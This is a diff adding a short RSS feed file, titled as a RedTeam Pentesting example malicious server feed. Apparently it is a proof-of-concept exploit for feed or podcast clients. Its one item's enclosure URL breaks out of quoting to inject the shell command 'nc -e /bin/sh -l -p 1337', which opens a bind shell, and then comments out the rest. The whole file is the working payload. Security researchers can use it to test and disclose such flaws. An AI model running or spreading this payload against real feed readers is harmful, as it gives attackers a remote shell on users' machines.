@@ -1,0 +1,13 @@
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;?xml-stylesheet type=&quot;text/xsl&quot;?&gt;
+&lt;rss version=&quot;2.0&quot;&gt;
+&lt;channel&gt;
+    &lt;title&gt;RedTeam Pentesting Example Malicious Server Feed&lt;/title&gt;
+
+    &lt;item&gt;
+        &lt;enclosure url=&quot;http://www.example.com/example.mp3&#039;; nc -e /bin/sh -l
+-p 1337 &amp;amp; &#039;;#&#039;&quot;
+         length=&quot;241734&quot; type=&quot;audio/mpeg&quot; /&gt;
+    &lt;/item&gt;
+&lt;/channel&gt;
+&lt;/rss&gt; 
